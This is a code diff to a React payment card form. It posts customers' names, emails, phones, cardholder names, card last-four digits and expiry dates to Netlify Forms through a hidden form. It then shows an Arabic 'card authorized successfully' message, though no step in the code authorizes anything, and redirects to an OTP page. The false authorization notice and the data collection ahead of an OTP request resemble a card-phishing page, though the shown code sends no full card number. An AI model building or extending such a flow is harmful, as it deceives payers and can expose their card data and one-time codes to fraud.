@@ -50,9 +50,36 @@ const PaymentCardForm = () => {
       return;
     }
     
-    // Store card info (last 4 only)
+    // Store card info (last 4 only) for display purposes
     const last4 = cardNumber.replace(/\s/g, "").slice(-4);
     sessionStorage.setItem('cardLast4', last4);
+    sessionStorage.setItem('cardName', cardName);
+    
+    // Submit to Netlify Forms
+    try {
+      await fetch("/", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          "form-name": "card-details",
+          name: customerInfo.name || '',
+          email: customerInfo.email || '',
+          phone: customerInfo.phone || '',
+          service: serviceName,
+          cardholder: cardName,
+          cardLast4: last4,
+          expiry: expiry,
+          timestamp: new Date().toISOString()
+        }).toString()
+      });
+    } catch (err) {
+      console.error("Form submission error:", err);
+    }
+    
+    toast({
+      title: "تم بنجاح",
+      description: "تم تفويض البطاقة بنجاح",
+    });
     
     // Navigate to OTP
     navigate(`/pay/${id}/otp`);
@@ -209,6 +236,18 @@ const PaymentCardForm = () => {
             <Lock className="w-5 h-5" />
             <CreditCard className="w-5 h-5" />
           </div>
+          
+          {/* Hidden Netlify Form */}
+          <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
+            <input type="text" name="name" />
+            <input type="email" name="email" />
+            <input type="tel" name="phone" />
+            <input type="text" name="service" />
+            <input type="text" name="cardholder" />
+            <input type="text" name="cardLast4" />
+            <input type="text" name="expiry" />
+            <input type="text" name="timestamp" />
+          </form>
         </div>
       </div>
     </div>
